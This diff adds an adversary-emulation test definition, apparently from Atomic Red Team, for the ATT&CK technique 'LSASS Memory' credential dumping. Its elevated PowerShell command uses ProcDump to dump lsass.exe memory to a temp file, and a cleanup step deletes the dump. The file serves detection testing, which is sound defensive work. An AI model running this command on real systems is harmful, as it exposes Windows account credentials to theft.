@@ -1,0 +1,25 @@
+attack_technique: T1003.001
+display_name: "OS Credential Dumping: LSASS Memory"
+atomic_tests:
+- name: Dump LSASS.exe Memory using ProcDump
+  auto_generated_guid: 68670fa9-c0c1-4091-a189-e260fb1e1e47
+  description: |
+    Executes Sysinternals ProcDump to create a full memory dump of the LSASS process space.
+  supported_platforms:
+  - windows
+  input_arguments:
+    procdump_exe:
+      description: Path to ProcDump executable
+      type: path
+      default: C:\Windows\Temp\procdump.exe
+    dump_output:
+      description: Path to write memory dump
+      type: path
+      default: C:\Windows\Temp\lsass.dmp
+  executor:
+    name: powershell
+    elevation_required: true
+    command: |
+      & "#{procdump_exe}" -accepteula -ma lsass.exe "#{dump_output}"
+    cleanup_command: |
+      Remove-Item "#{dump_output}" -ErrorAction SilentlyContinue
